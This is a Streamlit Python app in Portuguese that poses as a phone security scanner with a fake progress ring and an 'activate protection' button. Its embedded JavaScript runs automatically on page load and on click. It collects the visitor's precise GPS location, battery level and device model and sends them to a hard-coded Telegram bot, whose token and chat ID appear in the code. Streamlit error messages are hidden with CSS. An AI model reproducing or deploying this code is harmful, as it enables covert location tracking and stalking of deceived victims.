import streamlit as st
import time
from streamlit_js_eval import streamlit_js_eval

# --- DADOS DO TELEGRAM ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO (MANTIDA 100% INTACTA) ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

with caixa_bolha.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# --- O BOTÃO DESTRAVADO (SISTEMA DIRETO) ---
js_botao_destravado = f"""
<script>
async function forcarAtivacao() {{
    // 1. O clique chama o hardware IMEDIATAMENTE (sem passar pelo Python antes)
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                // Captura Bateria e Modelo
                const battery = await navigator.getBattery();
                const bLevel = Math.round(battery.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
                            "📱 *Modelo:* `" + model + "`\\n" +
                            "🔋 *Bateria:* `" + bLevel + "%`\\n" +
                            "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                
                // 2. O envio pro Telegram é feito pelo Navegador (Fetch) para não falhar
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{
                        chat_id: "{ID}",
                        text: msg,
                        parse_mode: "Markdown"
                    }})
                }});
                
                // 3. Só agora avisamos o Streamlit para girar a bolha
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{ console.log(e); }}
        }},
        (err) => {{ console.log("Acesso negado"); }},
        {{ enableHighAccuracy: true, timeout: 10000 }}
    );
}}

// Tenta disparar automático no carregamento também
setTimeout(forcarAtivacao, 1000);
</script>

<button class="btn-barra" onclick="forcarAtivacao()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza o componente (Botão Amarelo Comprido)
resultado_final = st.components.v1.html(js_botao_destravado, height=80)

# --- ANIMAÇÃO (Só acontece se o GPS responder) ---
if resultado_final:
    for p in range(4, 101, 8):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    st.success("Proteção Ativada!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
